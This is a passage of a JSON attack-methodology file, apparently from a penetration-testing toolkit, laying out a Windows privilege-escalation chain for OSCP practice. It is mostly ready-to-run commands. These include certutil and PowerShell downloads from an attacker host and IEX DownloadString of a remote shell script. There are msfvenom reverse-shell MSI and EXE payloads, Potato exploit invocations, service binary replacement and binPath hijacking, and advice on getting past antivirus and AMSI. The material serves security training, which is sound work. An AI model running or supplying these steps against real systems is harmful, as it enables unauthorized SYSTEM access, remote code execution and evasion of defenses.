{
  "id": "windows-privesc-full",
  "name": "Windows Privilege Escalation - Full Methodology",
  "description": "Comprehensive Windows privilege escalation workflow from initial shell to SYSTEM/Administrator.\n\nThis chain covers the complete attack path:\n1. Gain initial shell (limited user privileges)\n2. Enumerate system for privilege escalation vectors\n3. Identify exploitable misconfigurations or vulnerabilities\n4. Execute exploitation technique\n5. Verify elevated privileges obtained\n6. Interact with elevated shell for post-exploitation\n\nDesigned for OSCP exam methodology - prioritizes quick wins (Potato exploits, AlwaysInstallElevated) before complex techniques.",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team",
    "created": "2025-01-13",
    "updated": "2025-01-13",
    "tags": [
      "OSCP",
      "WINDOWS",
      "PRIVILEGE_ESCALATION",
      "POST_EXPLOITATION",
      "ENUMERATION",
      "SYSTEM",
      "QUICK_WIN",
      "AUTOMATED",
      "MANUAL"
    ],
    "category": "privilege_escalation",
    "platform": "windows",
    "references": [
      "https://www.fuzzysecurity.com/tutorials/16.html",
      "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md",
      "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
    ]
  },
  "difficulty": "intermediate",
  "time_estimate": "10-30 minutes",
  "oscp_relevant": true,
  "prerequisites": [
    "Shell access as low-privilege user (www-data, IIS APPPOOL, user account)",
    "Target system is Windows (7, 8, 10, Server 2008-2019)",
    "Basic command execution capability (cmd.exe or PowerShell)"
  ],
  "notes": "WINDOWS PRIVILEGE ESCALATION METHODOLOGY FOR OSCP:\n\nTHIS IS THE MOST CRITICAL SKILL FOR WINDOWS TARGETS IN OSCP.\n\nPRIORITY ORDER (FASTEST TO SLOWEST):\n1. Token Impersonation (SeImpersonate/SeAssignPrimaryToken) - 2 minutes\n2. AlwaysInstallElevated - 3 minutes\n3. Unquoted Service Paths - 5 minutes\n4. Weak Service Permissions - 5 minutes\n5. Registry AutoLogon Credentials - 3 minutes\n6. Scheduled Tasks (writable scripts) - 10 minutes\n7. Kernel Exploits - 15 minutes (last resort)\n\nCOMMON EXAM SCENARIOS:\n- Web shell as IIS APPPOOL\\DefaultAppPool (SeImpersonate = instant win)\n- RDP as standard user in Administrators group (UAC bypass needed)\n- Service account with saved credentials (runas /savecred)\n- Misconfigured service running as SYSTEM\n\nAUTOMATED VS MANUAL:\n- Use WinPEAS/PowerUp for initial enumeration (fast, comprehensive)\n- Manually verify findings before exploitation (avoid rabbit holes)\n- Know how to do everything manually (tools may be blocked by AV)\n\nTIME MANAGEMENT:\n- Spend 5 minutes on quick wins (whoami /priv, AlwaysInstallElevated)\n- Spend 10 minutes on automated enumeration (WinPEAS)\n- Spend 15 minutes on manual verification and exploitation\n- If nothing found in 30 minutes, revisit initial access vector\n\nSTEALTH CONSIDERATIONS:\n- Automated tools trigger AV (encode/obfuscate if needed)\n- Service restarts logged in Event Viewer (Event ID 7045)\n- Registry modifications tracked (Event ID 4657)\n- Process creation audited (Event ID 4688)\n- For exam: stealth doesn't matter, focus on speed\n\nCONDITIONAL LOGIC SUMMARY:\nThis chain uses decision points at each step:\n- IF SeImpersonate privilege \u2192 Potato exploit (immediate win)\n- IF AlwaysInstallElevated enabled \u2192 MSI payload (3 min to root)\n- IF unquoted service paths found \u2192 Path hijacking (5 min)\n- IF weak service permissions \u2192 Binary replacement (5 min)\n- ELSE \u2192 Manual enumeration for credentials, scheduled tasks, kernel exploits\n\nEach step includes failure conditions and alternative paths to avoid getting stuck.",
  "steps": [
    {
      "id": "initial-enumeration",
      "name": "Basic System Enumeration",
      "objective": "Gather system information to identify OS version, patch level, current user privileges, and group memberships",
      "description": "Run basic enumeration commands to establish baseline:\n\n1. System Information:\n   - OS version and architecture (x86 vs x64)\n   - Patch level (missing hotfixes = kernel exploits)\n   - Hostname and domain membership\n\n2. User Context:\n   - Current username (whoami)\n   - User privileges (SeImpersonate, SeDebugPrivilege)\n   - Group memberships (Administrators, Backup Operators)\n\n3. Network Context:\n   - IP configuration (ipconfig)\n   - Network shares (net share)\n   - Active connections (netstat)\n\nWHY THIS MATTERS:\n- OS version determines exploit compatibility\n- User privileges reveal quick-win paths (Potato exploits)\n- Group membership shows if UAC bypass needed vs full exploitation\n- Architecture (x86/x64) affects payload selection\n\nTIME ESTIMATE: 2-3 minutes",
      "command_ref": "win-systeminfo",
      "evidence": [
        "systeminfo output showing OS version (e.g., Windows 10 Pro 10.0.19041)",
        "whoami output showing current user (e.g., IIS APPPOOL\\DefaultAppPool, CORP\\user)",
        "whoami /all showing groups and privileges (CRITICAL: check for SeImpersonate)",
        "hostname showing computer name",
        "Architecture: x86 or x64 (determines payload compatibility)"
      ],
      "success_criteria": [
        "System information retrieved successfully",
        "Current user and privileges identified",
        "OS version and architecture confirmed",
        "Group memberships enumerated"
      ],
      "failure_conditions": [
        "Access denied on systeminfo (rare - try wmic os get instead)",
        "whoami not found (very old Windows - use set USERNAME)",
        "Restricted shell preventing command execution (break out of rbash/restricted PowerShell first)"
      ],
      "conditional_logic": {
        "IF whoami /priv shows SeImpersonate OR SeAssignPrimaryToken": {
          "action": "IMMEDIATE WIN - Skip to potato-privilege-check (Step 2)",
          "reason": "Token impersonation exploits (JuicyPotato, PrintSpoofer, RoguePotato) = SYSTEM in 2 minutes. This is THE fastest privesc path for Windows. Common on IIS, SQL Server, service accounts.",
          "time_saved": "20+ minutes (skip manual enumeration)"
        },
        "IF whoami /groups shows Administrators group": {
          "action": "Skip to uac-bypass-check (Step 7)",
          "reason": "User already admin but Medium integrity. Need UAC bypass (FodHelper, EventVwr) not full privilege escalation. Saves time searching for exploits you don't need.",
          "time_saved": "10+ minutes"
        },
        "IF systeminfo shows Windows 7 or Server 2008 with no patches": {
          "action": "Note for later: MS16-032, MS15-051 kernel exploits likely viable",
          "reason": "Unpatched old Windows = kernel exploit paradise. But try other methods first (safer, less likely to crash system).",
          "priority": "Low (kernel exploits = last resort)"
        },
        "ELSE": {
          "action": "Continue to Step 3 (automated enumeration)",
          "reason": "No quick wins found in basic enumeration. Need deeper investigation with automated tools."
        }
      },
      "next_steps": [
        "potato-privilege-check",
        "uac-bypass-check",
        "automated-enumeration"
      ]
    },
    {
      "id": "potato-privilege-check",
      "name": "Check for Potato Exploit Eligibility (QUICK WIN)",
      "objective": "Verify if SeImpersonate or SeAssignPrimaryToken privilege is enabled, allowing token impersonation to SYSTEM",
      "description": "CRITICAL QUICK WIN CHECK:\n\nPotato-family exploits are the #1 privilege escalation path for Windows service accounts.\n\nPRIVILEGES TO LOOK FOR:\n- SeImpersonatePrivilege (Impersonate a client after authentication)\n- SeAssignPrimaryTokenPrivilege (Replace a process level token)\n\nCOMMON SCENARIOS WHERE THESE EXIST:\n- IIS application pool accounts (IIS APPPOOL\\DefaultAppPool)\n- SQL Server service accounts (MSSQLSERVER, SQLSERVERAGENT)\n- Local Service / Network Service accounts\n- Any service running under custom user account\n\nIF ENABLED \u2192 SYSTEM shell in 2-5 minutes guaranteed.\n\nEXPLOIT VARIANTS (choose based on Windows version):\n- JuicyPotato: Windows 7, 8, Server 2008-2016, Windows 10 < 1809\n- RoguePotato: Windows 10 1809+, Server 2019+\n- PrintSpoofer: Windows 10, Server 2019+ (simplest, recommended)\n- SweetPotato: Universal (works on all versions)\n\nVERIFICATION:\nwhoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"\n\nLook for 'Enabled' status (not just 'Disabled' presence).",
      "command_ref": "win-potato-exploits",
      "dependencies": [
        "initial-enumeration"
      ],
      "evidence": [
        "whoami /priv output showing SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
        "Privilege status shows 'Enabled' (not 'Disabled')",
        "User context is service account (IIS APPPOOL, MSSQL, etc.)"
      ],
      "success_criteria": [
        "At least one impersonation privilege is Enabled",
        "Windows version identified for exploit selection",
        "Service account context confirmed"
      ],
      "failure_conditions": [
        "No impersonation privileges present (standard user account)",
        "Privileges exist but Disabled (need different privesc path)",
        "Highly restricted environment (AppLocker, WDAC blocking exploit binaries)"
      ],
      "conditional_logic": {
        "IF SeImpersonate OR SeAssignPrimaryToken is Enabled": {
          "action": "Execute Potato exploit (potato-exploitation step)",
          "reason": "GUARANTEED SYSTEM shell. This is the fastest privesc technique for Windows.",
          "tools": {
            "Windows 10 1809+ / Server 2019+": "PrintSpoofer.exe -i -c cmd (simplest, works everywhere)",
            "Windows 7-10 1803 / Server 2008-2016": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
            "Universal fallback": "SweetPotato.exe -p cmd.exe -a '/c whoami'",
            "Alternate": "RoguePotato.exe (requires local network listener)"
          },
          "time_estimate": "2-5 minutes (download exploit, execute, verify)"
        },
        "IF privileges Disabled but present": {
          "action": "Continue to Step 3 (automated enumeration)",
          "reason": "Impersonation privileges exist but not enabled. Unlikely to enable them. Need different privesc path."
        },
        "IF no impersonation privileges": {
          "action": "Continue to Step 3 (automated enumeration)",
          "reason": "Not a service account. Try AlwaysInstallElevated, service misconfigurations, or credential harvesting."
        }
      },
      "next_steps": [
        "potato-exploitation",
        "automated-enumeration"
      ]
    },
    {
      "id": "potato-exploitation",
      "name": "Execute Potato Exploit to SYSTEM",
      "objective": "Exploit SeImpersonate privilege to spawn SYSTEM shell using PrintSpoofer, JuicyPotato, or equivalent",
      "description": "EXECUTION WORKFLOW:\n\n1. Transfer exploit binary to target:\n   - certutil -urlcache -f http://<LHOST>/PrintSpoofer.exe C:\\temp\\p.exe\n   - OR: PowerShell download: (New-Object Net.WebClient).DownloadFile('http://<LHOST>/PrintSpoofer.exe','C:\\temp\\p.exe')\n   - OR: SMB share: copy \\\\<LHOST>\\share\\PrintSpoofer.exe C:\\temp\\p.exe\n\n2. Execute exploit:\n   - PrintSpoofer: C:\\temp\\PrintSpoofer.exe -i -c cmd\n   - JuicyPotato: C:\\temp\\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}\n   - SweetPotato: C:\\temp\\SweetPotato.exe -p cmd.exe -a '/c whoami'\n\n3. Verify SYSTEM shell:\n   - whoami (should return 'nt authority\\system')\n   - whoami /priv (should show ALL privileges enabled)\n\nREVERSE SHELL ALTERNATIVE:\nInstead of interactive cmd:\n  PrintSpoofer.exe -c \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"\n\nCLSID SELECTION (for JuicyPotato):\n- Windows 10 Enterprise: {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}\n- Windows 10 Pro: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}\n- Windows Server 2019: {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}\n- Full list: https://github.com/ohpe/juicy-potato/tree/master/CLSID\n\nCOMMON ISSUES:\n- AV blocks exploit binary \u2192 Encode with base64 or use obfuscation\n- Port 1337 in use \u2192 Change -l flag to different port\n- CLSID doesn't work \u2192 Try different CLSID from GitHub list",
      "command_ref": "windows-potato-attacks",
      "dependencies": [
        "potato-privilege-check"
      ],
      "evidence": [
        "Exploit binary transferred to target (file exists check)",
        "Exploit executes without errors",
        "New process spawned (cmd.exe or powershell.exe)",
        "whoami returns 'nt authority\\system'",
        "Full privileges enabled (SeDebugPrivilege, SeTcbPrivilege, etc.)"
      ],
      "success_criteria": [
        "SYSTEM shell obtained (whoami = nt authority\\system)",
        "All privileges enabled (whoami /priv shows extensive list)",
        "Can access SYSTEM-only locations (C:\\Windows\\System32\\config)",
        "Can read sensitive files (SAM, SYSTEM hives)"
      ],
      "failure_conditions": [
        "Exploit binary blocked by AV/EDR (encode or obfuscate)",
        "CLSID doesn't work (try different CLSID or different exploit tool)",
        "Port conflict on listener port (change -l parameter)",
        "Exploit crashes system (rare - use PrintSpoofer which is most stable)",
        "No network connectivity to download exploit (use alternative transfer method)"
      ],
      "conditional_logic": {
        "IF exploit succeeds": {
          "action": "Skip to verify-system-access (Step 11)",
          "reason": "SYSTEM shell obtained. Privilege escalation complete. Proceed to post-exploitation (credential dumping, persistence).",
          "celebration": "YOU WIN - SYSTEM access in <5 minutes via Potato exploit"
        },
        "IF exploit fails (CLSID issue)": {
          "action": "Try alternative CLSID or different Potato variant",
          "reason": "JuicyPotato CLSID is system-specific. Try 3-5 CLSIDs before giving up. Switch to PrintSpoofer (no CLSID needed) if persistent failures."
        },
        "IF AV blocks exploit": {
          "action": "Encode exploit binary or use PowerShell-based implementation",
          "reason": "Signature-based detection. Encode with base64, use Invoke-Mimikatz pattern, or compile from source with different compiler."
        },
        "IF all Potato exploits fail": {
          "action": "Continue to Step 3 (automated enumeration)",
          "reason": "Rare failure. Possible causes: Patched system, highly restricted environment, EDR blocking. Try service exploitation or credential harvesting instead."
        }
      },
      "next_steps": [
        "verify-system-access",
        "automated-enumeration"
      ]
    },
    {
      "id": "automated-enumeration",
      "name": "Automated Privilege Escalation Enumeration",
      "objective": "Run WinPEAS or PowerUp to comprehensively scan for privilege escalation vectors",
      "description": "AUTOMATED TOOLS FIND MISCONFIGURATIONS FASTER THAN MANUAL ENUMERATION:\n\n1. WinPEAS (Recommended for OSCP):\n   - Transfer: certutil -urlcache -f http://<LHOST>/winPEASany.exe C:\\temp\\w.exe\n   - Execute: C:\\temp\\w.exe\n   - Focus on RED/YELLOW findings (critical vulnerabilities)\n   - Runtime: 30-60 seconds\n\n2. PowerUp (PowerShell alternative):\n   - Execute: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks\n   - Fileless execution (no disk write)\n   - May be blocked by AMSI (need bypass)\n   - Runtime: 20-40 seconds\n\nKEY FINDINGS TO LOOK FOR:\n- Unquoted Service Paths (with spaces in path)\n- AlwaysInstallElevated (registry keys set to 0x1)\n- Modifiable Service Binaries (weak file permissions)\n- Modifiable Service Config (SERVICE_CHANGE_CONFIG access)\n- AutoLogon Credentials (registry stored passwords)\n- Scheduled Tasks (writable scripts/binaries)\n- Kernel Exploit Suggestions (missing patches)\n\nOUTPUT INTERPRETATION:\nWinPEAS uses color coding:\n- RED = Critical (immediate exploitation path)\n- YELLOW = High priority (likely exploitable)\n- GREEN = Informational (context, not direct exploit)\n\nPowerUp output:\n- ServiceName, Description, AbuseFunction provided for each finding\n- Use Invoke-ServiceAbuse for automatic exploitation\n\nMANUAL ALTERNATIVE (if tools blocked):\nRun individual checks from Step 4-9 manually.",
      "command_ref": "win-privesc-winpeas",
      "dependencies": [
        "initial-enumeration"
      ],
      "evidence": [
        "WinPEAS or PowerUp output showing enumeration results",
        "RED/YELLOW findings indicating privilege escalation paths",
        "Specific vulnerabilities identified (service names, registry keys, file paths)",
        "Recommendations for exploitation provided by tool"
      ],
      "success_criteria": [
        "Automated tool executes successfully",
        "Output contains actionable findings (at least one exploitable path)",
        "Exploitation technique clearly identified",
        "Tool completes in <2 minutes"
      ],
      "failure_conditions": [
        "AV blocks WinPEAS/PowerUp execution (encode binary or use manual enumeration)",
        "AMSI blocks PowerShell download (bypass AMSI first)",
        "Tool runs but finds nothing (fully patched system - try manual enumeration anyway)",
        "Tool crashes or hangs (kill process, try alternative tool or manual checks)"
      ],
      "conditional_logic": {
        "IF AlwaysInstallElevated found (both HKLM and HKCU = 0x1)": {
          "action": "Skip to alwaysinstallelevated-exploit (Step 5)",
          "reason": "QUICK WIN - MSI payload runs as SYSTEM automatically. 3-minute path to root.",
          "time_estimate": "3 minutes to SYSTEM"
        },
        "IF Unquoted Service Paths found": {
          "action": "Proceed to unquoted-service-check (Step 6)",
          "reason": "Common misconfiguration. Verify write permissions on parent directories, then exploit.",
          "time_estimate": "5-10 minutes"
        },
        "IF Modifiable Service Binary or Config found": {
          "action": "Proceed to service-permissions-check (Step 8)",
          "reason": "Replace service binary or change binPath to malicious executable. Restart service for SYSTEM shell.",
          "time_estimate": "5-10 minutes"
        },
        "IF AutoLogon credentials found": {
          "action": "Use credentials for lateral movement or runas to admin",
          "reason": "Cleartext password in registry. Often admin account. Use for privilege escalation.",
          "time_estimate": "2 minutes"
        },
        "IF Scheduled Tasks with writable scripts found": {
          "action": "Proceed to scheduled-tasks-check (Step 9)",
          "reason": "Replace task script/binary. Wait for task execution for elevated access.",
          "time_estimate": "10-20 minutes (depends on task schedule)"
        },
        "IF Kernel Exploits suggested": {
          "action": "Note for last resort - proceed with other techniques first",
          "reason": "Kernel exploits risky (can crash system). Only use if no other options. Test in safe environment first.",
          "priority": "LOW"
        },
        "IF no findings": {
          "action": "Proceed to manual enumeration (Step 10)",
          "reason": "Automated tools miss some vectors (DLL hijacking, custom applications). Manual checks required."
        }
      },
      "next_steps": [
        "alwaysinstallelevated-exploit",
        "unquoted-service-check",
        "uac-bypass-check",
        "service-permissions-check",
        "scheduled-tasks-check",
        "manual-enumeration"
      ]
    },
    {
      "id": "alwaysinstallelevated-exploit",
      "name": "AlwaysInstallElevated Exploitation (QUICK WIN)",
      "objective": "Exploit AlwaysInstallElevated registry setting to install malicious MSI as SYSTEM",
      "description": "ALWAYSINSTALLELEVATED = INSTANT SYSTEM SHELL:\n\nREQUIREMENTS:\nBoth registry keys must be set to 0x1:\n1. HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1\n2. HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1\n\nVERIFICATION:\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\nBoth must return: AlwaysInstallElevated REG_DWORD 0x1\n\nEXPLOITATION WORKFLOW:\n\n1. Generate malicious MSI (on attacker machine):\n   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi > shell.msi\n\n2. Transfer MSI to target:\n   certutil -urlcache -f http://<LHOST>/shell.msi C:\\temp\\shell.msi\n\n3. Start listener on attacker:\n   nc -lvnp <LPORT>\n\n4. Execute MSI on target:\n   msiexec /quiet /qn /i C:\\temp\\shell.msi\n\n5. Receive SYSTEM shell on listener:\n   whoami \u2192 nt authority\\system\n\nFLAGS EXPLAINED:\n- /quiet = No UI during installation\n- /qn = Completely silent install (no dialogs)\n- /i = Install package\n\nCLEANUP:\ndel C:\\temp\\shell.msi\n\nWHY THIS WORKS:\nAlwaysInstallElevated is Group Policy setting intended for corporate environments where standard users need to install software. When enabled, ALL MSI installers run with SYSTEM privileges, even custom malicious ones.\n\nCOMMON IN:\n- Poorly configured domain environments\n- Development/test systems\n- Legacy systems with relaxed security policies\n\nTIME ESTIMATE: 3-5 minutes from verification to SYSTEM shell.",
      "command_ref": "win-always-install-elevated",
      "dependencies": [
        "automated-enumeration"
      ],
      "evidence": [
        "Both HKLM and HKCU registry keys set to 0x1",
        "MSI payload transferred to target",
        "msiexec process executes without errors",
        "Reverse shell received with SYSTEM privileges"
      ],
      "success_criteria": [
        "Registry verification confirms both keys enabled",
        "MSI installs successfully (msiexec exits without errors)",
        "SYSTEM shell obtained (whoami = nt authority\\system)",
        "Full privileges confirmed (whoami /priv shows all enabled)"
      ],
      "failure_conditions": [
        "Only one registry key set (both required - exploitation fails)",
        "MSI blocked by AppLocker or software restriction policy",
        "AV detects and blocks msfvenom payload (encode or use custom MSI)",
        "No network connectivity for reverse shell (use bind shell instead)",
        "msiexec hangs or fails (check Event Viewer Application log for MSI errors)"
      ],
      "conditional_logic": {
        "IF both registry keys enabled": {
          "action": "Generate and execute MSI payload immediately",
          "reason": "Guaranteed SYSTEM shell. Fastest exploitation path after Potato exploits.",
          "time_estimate": "3 minutes to SYSTEM"
        },
        "IF only one key enabled": {
          "action": "Continue to Step 6 (unquoted service paths)",
          "reason": "Both keys required for exploitation. Single key doesn't allow privilege escalation."
        },
        "IF MSI succeeds": {
          "action": "Skip to verify-system-access (Step 11)",
          "reason": "SYSTEM shell obtained. Privilege escalation complete."
        },
        "IF AV blocks payload": {
          "action": "Encode MSI or use custom installer (WiX Toolset)",
          "reason": "Signature-based detection. Create custom MSI with legitimate-looking installer actions."
        },
        "IF both keys disabled": {
          "action": "Continue to Step 6 (unquoted service paths)",
          "reason": "AlwaysInstallElevated not configured. Try service exploitation."
        }
      },
      "next_steps": [
        "verify-system-access",
        "unquoted-service-check"
      ]
    },
    {
      "id": "unquoted-service-check",
      "name": "Unquoted Service Path Exploitation",
      "objective": "Identify and exploit services with unquoted paths containing spaces for privilege escalation",
      "description": "UNQUOTED SERVICE PATHS EXPLAINED:\n\nVULNERABILITY:\nService path: C:\\Program Files\\My Service\\service.exe (UNQUOTED)\n\nWindows execution order when path contains spaces:\n1. C:\\Program.exe\n2. C:\\Program Files\\My.exe  \n3. C:\\Program Files\\My Service\\service.exe\n\nIf attacker can write C:\\Program.exe \u2192 Executes as SYSTEM when service starts.\n\nENUMERATION:\nwmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\\\Windows\\\\\\\\\" | findstr /i /v \"\"\"\"\n\nLook for:\n- Auto-start services (restart on reboot)\n- Paths with spaces (e.g., Program Files, Company Name)\n- No quotes around path\n- Service runs as SYSTEM or LocalSystem\n\nVERIFY WRITE PERMISSIONS:\nicacls \"C:\\Program Files\"\nicacls \"C:\\Program Files\\My Service\"\n\nLook for:\n- (F) = Full control\n- (M) = Modify\n- (W) = Write\n- For current user or Everyone/Authenticated Users groups\n\nEXPLOITATION:\n\n1. Generate payload matching service architecture:\n   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > Program.exe\n\n2. Upload to writable path:\n   certutil -urlcache -f http://<LHOST>/Program.exe \"C:\\Program Files\\Program.exe\"\n\n3. Restart service:\n   sc stop <ServiceName>\n   sc start <ServiceName>\n   OR reboot system (if can't stop/start manually)\n\n4. Receive SYSTEM shell when service starts\n\nCOMMON WRITABLE PATHS:\n- C:\\ root (older Windows versions)\n- C:\\Program Files (misconfigured permissions)\n- Custom application directories\n\nRESTRICTIONS:\n- Modern Windows: C:\\Program Files requires admin to write\n- May need to wait for system reboot if can't restart service manually\n- Service account must be SYSTEM for SYSTEM shell (verify with sc qc <service>)",
      "command_ref": "win-unquoted-service-paths",
      "dependencies": [
        "automated-enumeration"
      ],
      "evidence": [
        "Unquoted service paths found via wmic query",
        "Service runs as SYSTEM (sc qc <service> shows SERVICE_START_NAME: LocalSystem)",
        "Write permissions confirmed on parent directory (icacls shows (M) or (W) or (F))",
        "Service is auto-start or can be manually restarted"
      ],
      "success_criteria": [
        "At least one exploitable unquoted service path found",
        "Write permissions confirmed on exploitation path",
        "Service can be restarted (manually or via reboot)",
        "Payload executes when service starts"
      ],
      "failure_conditions": [
        "No unquoted paths found (all services properly quoted)",
        "Unquoted paths exist but no write permissions on parent directories",
        "Service runs as low-privilege account (not SYSTEM - limited value)",
        "Cannot restart service and no reboot available",
        "Payload blocked by AV when placed in exploitation path"
      ],
      "conditional_logic": {
        "IF exploitable unquoted path found with write permissions": {
          "action": "Generate and place payload in exploitation path",
          "reason": "Clear privilege escalation vector. Place malicious executable in path Windows checks before legitimate service binary.",
          "time_estimate": "5-10 minutes (payload gen + upload + service restart)"
        },
        "IF service found but no write permissions": {
          "action": "Continue to Step 8 (service permissions check)",
          "reason": "Unquoted path exists but can't exploit. Check if service configuration itself is modifiable instead."
        },
        "IF can restart service manually": {
          "action": "Restart service immediately after payload placement",
          "reason": "Faster exploitation. No waiting for reboot.",
          "commands": [
            "sc stop <service>",
            "sc start <service>"
          ]
        },
        "IF cannot restart service (access denied)": {
          "action": "Check if service auto-starts on boot, schedule for next reboot",
          "reason": "Will exploit on next system restart. Note in documentation, continue to other privesc methods in meantime."
        },
        "IF no exploitable unquoted paths": {
          "action": "Continue to Step 7 (UAC bypass check)",
          "reason": "No unquoted service misconfigurations. Try UAC bypass or service permission abuse."
        }
      },
      "next_steps": [
        "service-permissions-check",
        "uac-bypass-check",
        "verify-system-access"
      ]
    },
    {
      "id": "uac-bypass-check",
      "name": "UAC Bypass Requirement Check",
      "objective": "Determine if user is in Administrators group but running with Medium integrity (UAC enabled)",
      "description": "UAC (USER ACCOUNT CONTROL) BYPASS SCENARIO:\n\nCHECK IF APPLICABLE:\n1. User in Administrators group:\n   net localgroup administrators\n   whoami /groups | findstr /i \"S-1-5-32-544\" (Admin group SID)\n\n2. But shell has Medium integrity:\n   whoami /groups | findstr /i \"Mandatory Label\"\n   \u2192 Should show \"Medium Mandatory Level\" (not High)\n\n3. UAC is enabled:\n   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\n   \u2192 Should return 0x1\n\nWHY THIS HAPPENS:\nUser account is local admin, but UAC provides two tokens:\n- Filtered Admin Token (Medium integrity - current shell)\n- Full Admin Token (High integrity - requires elevation)\n\nWITHOUT UAC BYPASS:\n- Can't access ADMIN$ share, C$ share\n- Can't modify SYSTEM files or registry (HKLM\\SAM, etc.)\n- Can't create/modify services\n- Can't install drivers\n- Can't debug other users' processes\n\nWITH UAC BYPASS:\n- All admin capabilities unlocked\n- No SYSTEM shell but nearly equivalent\n- Can then use admin rights to escalate to SYSTEM\n\nUAC BYPASS TECHNIQUES:\n1. FodHelper (Windows 10 build 17134+)\n   - Fastest, most reliable\n   - Registry hijack of ms-settings handler\n   - Executes without UAC prompt\n\n2. EventVwr (Windows 7-10)\n   - Broader compatibility\n   - Registry hijack of mscfile handler  \n   - Backup option if FodHelper patched\n\nWHEN NOT NEEDED:\n- User is standard user (not in Admins group) \u2192 Need full privesc, not UAC bypass\n- Shell already High integrity \u2192 Already elevated, no bypass needed\n- UAC disabled (EnableLUA=0) \u2192 User already has full admin rights\n\nVERIFICATION AFTER BYPASS:\nwhoami /groups | findstr /i \"Mandatory Label\"\n\u2192 Should show \"High Mandatory Level\"\n\nTIME ESTIMATE: 2-3 minutes (verification + bypass + confirm)",
      "command_ref": "check-integrity-level",
      "dependencies": [
        "automated-enumeration"
      ],
      "evidence": [
        "whoami /groups shows user in Administrators group (S-1-5-32-544)",
        "Integrity level check shows Medium Mandatory Level",
        "EnableLUA registry key = 0x1 (UAC enabled)",
        "Current shell has limited admin capabilities"
      ],
      "success_criteria": [
        "User confirmed in Administrators group",
        "Medium integrity level confirmed",
        "UAC confirmed enabled",
        "UAC bypass technique applicable"
      ],
      "failure_conditions": [
        "User not in Administrators group (need full privesc, not UAC bypass)",
        "Already High integrity (UAC bypass not needed)",
        "UAC disabled (user has full admin rights already)",
        "Domain user without local admin rights (UAC bypass won't help)"
      ],
      "conditional_logic": {
        "IF user in Admins + Medium integrity + UAC enabled": {
          "action": "Execute UAC bypass (FodHelper or EventVwr)",
          "reason": "User is already admin but filtered by UAC. Bypass unlocks full admin capabilities without credential requirement.",
          "technique": "Use fodhelper-uac-bypass for Windows 10 or eventvwr-uac-bypass for broader compatibility",
          "time_estimate": "2-3 minutes to High integrity"
        },
        "IF already High integrity": {
          "action": "Skip UAC bypass, proceed to SYSTEM escalation techniques",
          "reason": "Already elevated. Use admin rights to access services, create scheduled tasks, or use SeDebugPrivilege for SYSTEM escalation."
        },
        "IF user not in Admins group": {
          "action": "Continue to Step 8 (service permissions)",
          "reason": "UAC bypass won't help standard users. Need credential harvesting or service exploitation."
        },
        "IF UAC disabled": {
          "action": "User already has full admin rights - proceed to SYSTEM escalation",
          "reason": "No filtered token. User's admin capabilities already active. Can modify services, access ADMIN$, etc."
        }
      },
      "next_steps": [
        "uac-bypass-execution",
        "service-permissions-check",
        "verify-high-integrity"
      ]
    },
    {
      "id": "service-permissions-check",
      "name": "Weak Service Permissions Exploitation",
      "objective": "Identify services with weak permissions allowing binary replacement or configuration modification",
      "description": "SERVICE PERMISSION ABUSE:\n\nTwo main attack vectors:\n1. Weak service binary permissions (replace executable)\n2. Weak service configuration permissions (modify binPath)\n\nENUMERATION (requires accesschk.exe from Sysinternals):\n\nCheck service permissions:\n  accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\n  accesschk.exe -uwcqv \"Everyone\" * /accepteula\n  accesschk.exe -uwcqv \"Users\" * /accepteula\n\nLook for:\n- SERVICE_ALL_ACCESS (full control - can do anything)\n- SERVICE_CHANGE_CONFIG (can modify service settings)\n- SERVICE_START / SERVICE_STOP (can restart service)\n\nCheck service binary permissions:\n  accesschk.exe -wuvc \"Everyone\" \"C:\\Program Files\\Service\\service.exe\"\n  icacls \"C:\\Program Files\\Service\\service.exe\"\n\nLook for:\n- (F) Full control\n- (M) Modify  \n- (W) Write\n- For current user or low-privilege groups\n\nEXPLOITATION PATH 1: Binary Replacement\n\n1. Find modifiable service binary:\n   sc qc <ServiceName>  (note BINARY_PATH_NAME)\n   icacls \"<binary_path>\"  (verify write permissions)\n\n2. Backup original binary:\n   copy \"C:\\Path\\service.exe\" \"C:\\Path\\service.exe.bak\"\n\n3. Replace with malicious payload:\n   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe\n   copy shell.exe \"C:\\Path\\service.exe\" /Y\n\n4. Restart service:\n   sc stop <ServiceName>\n   sc start <ServiceName>\n\n5. Receive SYSTEM shell (if service runs as SYSTEM)\n\nEXPLOITATION PATH 2: Service Configuration Modification\n\n1. Find service with SERVICE_CHANGE_CONFIG permission:\n   accesschk.exe -uwcqv <ServiceName>\n\n2. Query current configuration:\n   sc qc <ServiceName>\n   (Note original binPath for restoration)\n\n3. Modify binPath to malicious command:\n   sc config <ServiceName> binPath= \"cmd /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"\n\n4. Restart service:\n   sc stop <ServiceName>\n   sc start <ServiceName>\n\n5. Receive 